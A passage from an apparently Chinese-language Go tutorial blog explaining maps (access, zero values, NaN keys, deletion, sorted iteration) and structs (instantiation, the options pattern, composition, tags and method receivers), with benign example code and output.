class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">string</span>&#123;<br><span class="hljs-number">0</span>: <span class="hljs-string">&quot;b&quot;</span>,<br><span class="hljs-number">1</span>: <span class="hljs-string">&quot;u&quot;</span>,<br><span class="hljs-number">2</span>: <span class="hljs-string">&quot;t&quot;</span>,<br><span class="hljs-number">3</span>: <span class="hljs-string">&quot;3&quot;</span>,<br>&#125;<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[<span class="hljs-number">0</span>:b <span class="hljs-number">1</span>:u <span class="hljs-number">2</span>:t <span class="hljs-number">3</span>:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p>map 的访问和数组通过索引访问差不多，通过 Key 访问 Value</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br>fmt.Println(mp[<span class="hljs-string">&quot;a&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;b&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;c&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;d&quot;</span>])<br>fmt.Println(mp[<span class="hljs-string">&quot;e&quot;</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的代码中并不存在 e 的键值对，但是依然有返回值 0，map 对于不存在的键返回值是对应类型的<strong>零值</strong>，并且在访问 map 的时候其实有两个返回值，第一个返回对应类型的值，第二个返回值为布尔值，代表键是否存在，比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br><span class="hljs-keyword">if</span> val, exist := mp[<span class="hljs-string">&quot;e&quot;</span>]; exist &#123;<br>fmt.Println(val)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;不存在&quot;</span>)<br>&#125;<br>&#125;<br>&gt;&gt;<br>不存在<br></code></pre></td></tr></table></figure><p>求 map 长度用 <code>len()</code> 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">len</span>(mp)<br></code></pre></td></tr></table></figure><h2 id="存值"><a href="#存值" class="headerlink" title="存值"></a>存值</h2><p>类似数组存值，存值时使用已存在的键会覆盖原有的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>mp[<span class="hljs-string">&quot;a&quot;</span>] = <span class="hljs-number">1</span><br>mp[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> _, exist := mp[<span class="hljs-string">&quot;b&quot;</span>]; exist &#123;<br>mp[<span class="hljs-string">&quot;b&quot;</span>] = <span class="hljs-number">3</span><br>&#125;<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[a:<span class="hljs-number">1</span> b:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>但是当键为 <code>math.NaN()</code> 时</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">float64</span>]<span class="hljs-type">string</span>, <span class="hljs-number">10</span>)<br>mp[math.NaN()] = <span class="hljs-string">&quot;a&quot;</span><br>mp[math.NaN()] = <span class="hljs-string">&quot;b&quot;</span><br>mp[math.NaN()] = <span class="hljs-string">&quot;c&quot;</span><br>_, exist := mp[math.NaN()]<br>fmt.Println(exist)<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-literal">false</span><br><span class="hljs-keyword">map</span>[NaN:c NaN:a NaN:b]<br></code></pre></td></tr></table></figure><p>相同的键值并没有被覆盖，而是并存。NaN 的实现是由底层的汇编指令 <code>UCOMISD</code> 完成的，这是一个无序比较双精度浮点数的指令。任何数字都不等于 NaN，NaN 也不等于自身，每次哈希值就不同，所以不要用 NaN 作为 map 的键</p><h2 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h2><p>删除键值对，用 <code>delete()</code> 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">delete</span>(<span class="hljs-keyword">map</span>,key)<br><span class="hljs-keyword">map</span>:要删除的 <span class="hljs-keyword">map</span><br>key:要删除的键值对的 key<br></code></pre></td></tr></table></figure><p>比如</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br>fmt.Println(mp)<br><span class="hljs-built_in">delete</span>(mp, <span class="hljs-string">&quot;a&quot;</span>)<br>fmt.Println(mp)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">map</span>[a:<span class="hljs-number">0</span> b:<span class="hljs-number">1</span> c:<span class="hljs-number">2</span> d:<span class="hljs-number">3</span>]<br><span class="hljs-keyword">map</span>[b:<span class="hljs-number">1</span> c:<span class="hljs-number">2</span> d:<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>如果值为 NaN，那么没办法删除键值对</p><h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><p>用 <code>for range</code> 遍历 map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>mp := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br><span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-number">2</span>,<br><span class="hljs-string">&quot;d&quot;</span>: <span class="hljs-number">3</span>,<br>&#125;<br><span class="hljs-keyword">for</span> key, val := <span class="hljs-keyword">range</span> mp &#123;<br>fmt.Println(key, val)<br>&#125;<br>&#125;<br>&gt;&gt;<br>c <span class="hljs-number">2</span><br>d <span class="hljs-number">3</span><br>a <span class="hljs-number">0</span><br>b <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>因为 map 是无序的，遍历出来也是无序的</p><p>按照指定顺序遍历</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> scoreMap = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>key := fmt.Sprintf(<span class="hljs-string">&quot;%02d&quot;</span>, i)<br>value := rand.Intn(<span class="hljs-number">100</span>)<span class="hljs-comment">// 生成 0-99 的随机整数</span><br>scoreMap[key] = value<br>&#125;<br><span class="hljs-comment">// 取出 map 的所有 key 存入切片 keys</span><br><span class="hljs-keyword">var</span> keys = <span class="hljs-built_in">make</span>([]<span class="hljs-type">string</span>, <span class="hljs-number">0</span>, <span class="hljs-number">200</span>)<br><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> scoreMap &#123;<br>keys = <span class="hljs-built_in">append</span>(keys, key)<br>&#125;<br><span class="hljs-comment">// 对切片进行排序</span><br>sort.Strings(keys)<br><span class="hljs-comment">// 按照排序后的 key 遍历 map</span><br><span class="hljs-keyword">for</span> _, key := <span class="hljs-keyword">range</span> keys &#123;<br>fmt.Println(key, scoreMap[key])<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h1><p>结构体声明，和一般结构体声明一样</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> 类型名 <span class="hljs-keyword">struct</span> &#123;<br>  字段名 字段类型<br>  字段名 字段类型<br>  …<br>&#125;<br><br><span class="hljs-keyword">type</span> Programmer <span class="hljs-keyword">struct</span> &#123;<br>  Name     <span class="hljs-type">string</span><br>  Age      <span class="hljs-type">int</span><br>  Job      <span class="hljs-type">string</span><br>  Language []<span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h2><p>go 没有构造方法，初始化像 map 一样指定字段名称再初始化字段值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">programmer:=Programmer&#123;<br>Name:<span class="hljs-string">&quot;butt3rf1y&quot;</span>,<br>Age:<span class="hljs-number">18</span>,<br>Job:<span class="hljs-string">&quot;stu&quot;</span>,<br>Language:[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Go&quot;</span>,<span class="hljs-string">&quot;Java&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果实例化过程比较复杂，可以使用函数来实例化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>  Name    <span class="hljs-type">string</span><br>  Age     <span class="hljs-type">int</span><br>  Address <span class="hljs-type">string</span><br>  Salary  <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int</span>, address <span class="hljs-type">string</span>, salary <span class="hljs-type">float64</span>)</span></span> *Person &#123;<br>  <span class="hljs-keyword">return</span> &amp;Person&#123;Name: name, Age: age, Address: address, Salary: salary&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>就像构造函数，但是 go 不支持函数与方法重载，如果需要用多种方式实例化结构体，要么创建多个构造函数，要么使用 options 模式</p><h2 id="options-模式"><a href="#options-模式" class="headerlink" title="options 模式"></a>options 模式</h2><p>假设有一个下面的结构体</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>  Name     <span class="hljs-type">string</span><br>  Age      <span class="hljs-type">int</span><br>  Address  <span class="hljs-type">string</span><br>  Salary   <span class="hljs-type">float64</span><br>  Birthday <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>声明一个 <code>PersonOptions</code> 类型，接收一个 <code>*Person</code> 类型的参数，必须是指针</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> PersonOptions <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span><br></code></pre></td></tr></table></figure><p>创建选项函数，一般是 <code>With</code> 开头，返回值为一个闭包函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithName</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Name = name<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithAge</span><span class="hljs-params">(age <span class="hljs-type">int</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Age = age<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithAddress</span><span class="hljs-params">(address <span class="hljs-type">string</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Address = address<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithSalary</span><span class="hljs-params">(salary <span class="hljs-type">float64</span>)</span></span> PersonOptions &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(p *Person)</span></span> &#123;<br>p.Salary = salary<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实际声明的构造函数签名，接受一个可变长的 <code>PersonOptions</code> 类型的参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(options ...PersonOptions)</span></span> *Person &#123;<br>p:=&amp;Person&#123;&#125;<br><span class="hljs-keyword">for</span> _,option:=<span class="hljs-keyword">range</span> options&#123;<br>option(p)<br>&#125;<br><span class="hljs-keyword">if</span> p.Age&lt;<span class="hljs-number">0</span> &#123;<br>p.Age=<span class="hljs-number">0</span><br>&#125;<br>......<br><br><span class="hljs-keyword">return</span> p<br>&#125;<br></code></pre></td></tr></table></figure><p>对于不同实例化的需求只需要一个构造函数就行，传入不同的 Options 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>  &#123;<br>p1:=NewPerson(<br>WithName(<span class="hljs-string">&quot;butt3rf1y&quot;</span>),<br>WithAge(<span class="hljs-number">18</span>),<br>WithAddress(<span class="hljs-string">&quot;US&quot;</span>),<br>WithSalary(<span class="hljs-number">100.00</span>),<br>)<br><br>p2:=NewPerson(<br>WithName(<span class="hljs-string">&quot;kikk&quot;</span>),<br>WithAge(<span class="hljs-number">19</span>),<br>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h2><p>结构体之间的关系通过组合来表示，有显式组合和匿名组合</p><p>显式组合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>p      Person<br>school <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> Employee <span class="hljs-keyword">struct</span> &#123;<br>p   Person<br>job <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>如果需要显式的指定字段 p</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">student:=Student&#123;<br>p:Person&#123;name:<span class="hljs-string">&quot;jack&quot;</span>,age:<span class="hljs-number">18</span>&#125;,<br>school:<span class="hljs-string">&quot;lili school&quot;</span>,<br>&#125;<br>fmt.Println(student.p.name)<br></code></pre></td></tr></table></figure><p>匿名组合</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age <span class="hljs-type">int</span><br>&#125;<br><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>Person<br>school <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> Employee <span class="hljs-keyword">struct</span> &#123;<br>Person<br>job <span class="hljs-type">string</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> user <span class="hljs-keyword">struct</span> &#123;<br>Name <span class="hljs-type">string</span><br>Age  <span class="hljs-type">int</span><br>&#125;<br>user.Name = <span class="hljs-string">&quot;hhah&quot;</span><br>user.Age = <span class="hljs-number">18</span><br>fmt.Printf(<span class="hljs-string">&quot;%#v\n&quot;</span>, user)<br>&#125;<br>&gt;&gt;<br><span class="hljs-keyword">struct</span> &#123; Name <span class="hljs-type">string</span>; Age <span class="hljs-type">int</span> &#125;&#123;Name:<span class="hljs-string">&quot;hhah&quot;</span>, Age:<span class="hljs-number">18</span>&#125;<br></code></pre></td></tr></table></figure><p>匿名字段名称默认为类型名，调用者可以直接访问该类型的字段和方法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">student:=Student&#123;<br>Person:Person&#123;name:<span class="hljs-string">&quot;jack&quot;</span>,age:<span class="hljs-number">18</span>&#125;,<br>school:<span class="hljs-string">&quot;lili school&quot;</span>,<br>&#125;<br>fmt.Println(student.name)<br></code></pre></td></tr></table></figure><h2 id="指针-1"><a href="#指针-1" class="headerlink" title="指针"></a>指针</h2><p>结构体指针不需要解引用就能访问</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int</span><br>&#125;<br>p := &amp;Person&#123;<br>name: <span class="hljs-string">&quot;hhah&quot;</span>,<br>age:  <span class="hljs-number">18</span>,<br>&#125;<br>fmt.Println(p.age, p.name)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>p.age</code> 其实在编译时会转换为 <code>(*p).name</code></p><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>标签是结构体的元信息，可以在运行时通过反射的机制读取</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-string">`key1:&quot;value1&quot; key2:&quot;value2&quot;`</span><br></code></pre></td></tr></table></figure><p>假如 Student 结构体每个字段定义 json 序列化时用 Tag:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Student <span class="hljs-keyword">struct</span> &#123;<br>ID     <span class="hljs-type">int</span> <span class="hljs-string">`json:&quot;id&quot;`</span><br>Gender <span class="hljs-type">string</span><br>name   <span class="hljs-type">string</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := Student&#123;<br>ID:     <span class="hljs-number">1</span>,<br>Gender: <span class="hljs-string">&quot;女&quot;</span>,<br>name:   <span class="hljs-string">&quot;hhah&quot;</span>,<br>&#125;<br>data, err := json.Marshal(s1)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;json marshal failed&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%s\n&quot;</span>, data)<br>&#125;<br>&gt;&gt;<br>&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;Gender&quot;</span>:<span class="hljs-string">&quot;女&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="方法和接收者"><a href="#方法和接收者" class="headerlink" title="方法和接收者"></a>方法和接收者</h2><p>方法（Method）是作用于特定类型变量的函数，特定类型变量叫接收者 (Receiver) </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(Receiver变量 Receiver类型)</span></span> 方法名(参数列表) (返回参数)&#123;<br>函数体<br>&#125;<br></code></pre></td></tr></table></figure><p>比如说</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">int8</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPerson</span><span class="hljs-params">(name <span class="hljs-type">string</span>, age <span class="hljs-type">int8</span>)</span></span> *Person &#123;<br><span class="hljs-keyword">return</span> &amp;Person&#123;<br>name: name,<br>age:  age,<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p Person)</span></span> Dream() &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%s&quot;</span>, p.name)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>p1 := NewPerson(<span class="hljs-string">&quot;hhah&quot;</span>, <span 